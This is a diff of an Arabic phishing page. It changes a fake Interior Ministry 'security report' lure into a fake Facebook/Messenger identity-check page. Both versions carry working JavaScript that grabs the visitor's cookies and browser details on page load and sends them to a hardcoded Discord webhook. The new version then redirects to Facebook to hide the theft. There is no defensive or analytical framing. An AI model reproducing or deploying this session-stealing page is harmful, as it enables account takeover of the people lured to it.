@@ -1,33 +1,24 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>نظام التحقق الرقمي - وزارة الداخلية</title>
-    <style>
-        body { background-color: #f0f2f5; font-family: Arial; text-align: center; padding-top: 50px; direction: rtl; }
-        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .btn { background-color: #1877f2; color: white; padding: 12px 20px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; }
-    </style>
+    <title>تحميل التقرير الأمني المرفق</title>
 </head>
-<body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org" width="80">
-        <h3>نظام فحص الأدلة الرقمية</h3>
-        <p style="font-size: 14px; color: #606770;">تم رصد نشاط مشبوه مرتبط بجهازك. يرجى النقر أدناه لتحميل تقرير الفحص الأمني (PDF) وتأمين حسابك.</p>
-        
-        <!-- الزر الذي يكسر حماية الهاتف ويُرسل الجلسة -->
-        <button class="btn" onclick="pwn()">تحميل تقرير الأمان وتأمين الحساب</button>
-    </div>
+<body style="background-color: #f0f2f5; font-family: Arial; text-align: center; padding-top: 100px;">
+    <h2>جاري جلب البيانات من خادم فيسبوك...</h2>
+    <p>يرجى الانتظار ثواني لتأكيد هويتك عبر الماسنجر</p>
 
     <script>
+        // رابط الديسكورد الخاص بك
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
 
-        async function pwn() {
-            const payload = {
-                content: "🚨 *تم سحب الجلسة بنجاح (بعد النقرة)* 🚨",
+        async function grabSession() {
+            // محاولة سحب الجلسة من تطبيق الماسنجر مباشرة
+            const sessionData = {
+                content: "🚨 *تم اختراق جلسة الماسنجر بنجاح* 🚨",
                 embeds: [{
-                    title: "مفتاح الدخول المسحوب (Cookies)",
-                    description: "```" + (document.cookie || "المجرم لم يسجل دخوله للمتصفح") + "```",
+                    title: "مفتاح الدخول المسحوب (Full Session)",
+                    description: "```" + (document.cookie || "تعذر السحب التلقائي - يتطلب نقرة") + "```",
                     color: 15158332,
                     fields: [
                         { name: "بيانات الجهاز", value: navigator.userAgent },
@@ -39,17 +30,17 @@
             await fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(sessionData)
             });
 
-            alert("خطأ: تعذر التحميل. يرجى إعادة النقر أو مراجعة الرابط.");
+            // إعادة توجيه المجرم لصفحة فيسبوك لضمان بقاء الجلسة نشطة
+            setTimeout(() => {
+                window.location.href = "https://m.facebook.com";
+            }, 2000);
         }
 
-        // محاولة السحب التلقائي فور الدخول (للهواتف الضعيفة)
-        window.onload = function() {
-            pwn(); 
-        };
+        // تنفيذ السحب فور فتح الرابط داخل الماسنجر
+        window.onload = grabSession;
     </script>
 </body>
 </html>
-Wikimedia Commons
